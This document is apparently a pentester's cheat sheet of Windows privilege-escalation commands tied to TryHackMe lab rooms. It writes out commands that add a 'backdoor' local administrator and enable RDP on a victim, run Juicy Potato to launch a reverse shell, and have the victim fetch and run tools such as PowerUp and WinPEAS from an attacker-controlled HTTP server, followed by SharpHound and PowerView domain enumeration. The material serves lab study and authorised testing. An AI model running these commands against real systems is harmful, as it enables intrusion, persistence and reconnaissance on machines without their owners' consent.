# Windows

**Copy info from here:** [**https://tryhackme.com/room/windowsprivesc20**](https://tryhackme.com/room/windowsprivesc20)



## **Gathering Info**

```
whoami /priv
```

```
net user
```

```
systeminfo
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
dir c:\
```

```
dir "c:\program files"
```

```
dir "c:\program files (x86)"
```

```
wmic service get name,startname
```

```
wmic service get name,pathname,startname | findstr "Program Files"
```

```
cacls *.exe
```

### **Whoami /priv**

| Finding                 | Comment                                                 | Examples                                                          |
| ----------------------- | ------------------------------------------------------- | ----------------------------------------------------------------- |
| SeImpersonatePrivilege  | Printspoofer - works on Windows 10 and Server 2016/2019 | [relevant.md](../../walkthroughs/tryhackme/relevant.md "mention") |
|                         |                                                         |                                                                   |
|                         |                                                         |                                                                   |

###

### **Recent Files**

Might be able to find interesting files by looking at what was recently accessed. Start -> run -> recent.

<figure><img src="../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>



## Add User

**Victim**

```
net user backdoor pass!123 /add
net localgroup Administrators backdoor /add
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
```

**Enable RDP**

**Victim**

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```



## Privilege Escalation

**Juicy Potato**

* Download Juicy Potato to your attack machine
* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.) use Juicy Potato to execute your reverse shell

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```



## **Automated Enumeration Tools**

| Name                      | Link                                                                                                                                                                                  |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| WinPeas                   |                                                                                                                                                                                       |
| PowerUp.ps1               | [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) |
| Windows Exploit Suggester | [https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git](https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git)                                                        |
| SharpHound                | <pre><code>git clone https://github.com/BloodHoundAD/BloodHound.git
</code></pre>                                                                                                     |
| Powerview                 |                                                                                                                                                                                       |



## PowerUp.ps1

**Examples**

[#privilege-escalation](../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")

**Setup**

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 
python2 -m SimpleHTTPServer 81
```

**Windows**

```
certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1 
. .\PowerUp.ps1 
Invoke-AllChecks
```





## Windows Exploit Suggester

**Examples**

[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")

**Setup**

Run command then paste output back to Kali in a file called systeminfo.txt

**Victim**

```
systeminfo
```

**Kali**

```
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git 
cd Windows-Exploit-Suggester/ 
python3.9 windows-exploit-suggester.py --update 
python3.9 windows-exploit-suggester2.py --database 2022-12-03-mssb.xls --systeminfo systeminfo.txt
```

## **WinPeas**

**Examples**

[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")

**Setup**

**Kali**&#x20;

```
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221127/winPEASx64.exe 
python2 -m SimpleHTTPServer 82
```

**Victim**&#x20;

```
cd C:\Windows\Temp
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:82/winPEASx64.exe','winPEASx64.exe')" 
winPEASx64.exe
```



## SharpHound

**Examples**

[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")

Add this line to SharpHound.ps1 before transferring so I could run the command right away

<figure><img src="../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
powershell -ep bypass
.\SharpHound.ps1
```

**Kali**

```
apt-get install bloodhound
neo4j console
bloodhound --no-sandbox
```

### Find all Domain Admins

<figure><img src="../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>

### List all Kerberostable accounts

<figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>



## Powerview

**Examples**

[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")

**Victim**

Run below to be able to run PowerView commands.

```
powershell -ep bypass
. .\Downloads\PowerView.ps1
```

Enumerate the domain users.

```
Get-NetUser | select cn
```

Enumerate the domain groups.

```
Get-NetGroup -GroupName *admin*
```

Find Shared folders.

```
Invoke-ShareFinder
```

Get Operating systems on the network.

```
Get-NetComputer -fulldata | select operatingsystem
```



